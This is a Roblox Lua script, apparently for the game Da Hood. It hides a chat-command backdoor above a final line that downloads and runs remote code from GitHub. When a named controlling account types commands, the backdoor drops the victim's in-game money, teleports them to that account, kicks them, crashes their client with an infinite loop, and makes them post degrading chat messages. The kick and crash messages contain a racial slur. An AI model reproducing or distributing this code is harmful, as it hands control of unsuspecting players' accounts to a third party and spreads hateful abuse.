function drop()
local args = {
    [1] = "DropMoney",
    [2] = "10000"
}

game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))
end

function message(message)
local args = {
    [1] = message,
    [2] = "All"
}
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
end

spawn(function()
    pcall(function()
local Admin = "xSyn2x"
local Table = {}


local function Chatted(Player)
    Player.Chatted:Connect(function(msg)
        msg = string.lower(msg)
        msg = string.gsub(msg, " ", "")
          if string.sub(msg,1,1) == ":" then
              if string.sub(msg,2,7) == "summon" or string.sub(msg,2,6) == "bring" then
                  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[Admin].Character.HumanoidRootPart.CFrame
                elseif
                string.sub(msg,2,10) == "apologize" then
                  message("I "..game.Players.LocalPlayer.DisplayName..", would like to apologize.")
                elseif
                string.sub(msg,2,5) == "Kick"  then
                    game.Players.LocalPlayer:Kick("nigger")
                elseif
                string.sub(msg,2,5) == "drop" then
                    drop()
                elseif
                string.sub(msg,2,3) == "re" or string.sub(msg,2,6) == "reset" then
                    game.Players.LocalPlayer.Character.Humanoid:Remove()
                elseif
                string.sub(msg,2,7) == "dfists" then
                    game.Players.LocalPlayer.Backpack:FindFirstChild("Combat").Parent = workspace
                elseif
                string.sub(msg,2,10) == "breakback" then
                    game.Players.LocalPlayer.Character.UpperTorso.Waist:remove()
                elseif
                string.sub(msg,2,5) == "rude" then
                    message("nobody likes u lol")
                elseif
                string.sub(msg,2,4) == "sit" then
                    game.Players.LocalPlayer.Character.Humanoid.Sit = true
                elseif
                string.sub(msg,2,7) == "praise" then
                    message("I praise... Master Enox")
                elseif
                string.sub(msg,2,6) == "crash" then
                    local crash = Instance.new("Message", game:GetService("CoreGui"))
	                crash.Text = 'damn nigger time to rejoin'
	                wait()
	                spawn(function() while true do end end)
	        end
	      end   
       end)
   end

for _, v in pairs(game.Players:GetChildren()) do
    if v.Name == Admin then
        Chatted(v)
    end
end

game.Players.PlayerAdded:Connect(function(Player)
    if Player.Name == Admin and not table.find(Table,Player.Name) then
        table.insert(Table, Player.Name)
        Chatted(Player)
    end
    end)
  end)
end)


loadstring(game:HttpGet('https://raw.githubusercontent.com/SpaceYes/Lua/Main/DaHood.Lua'))()
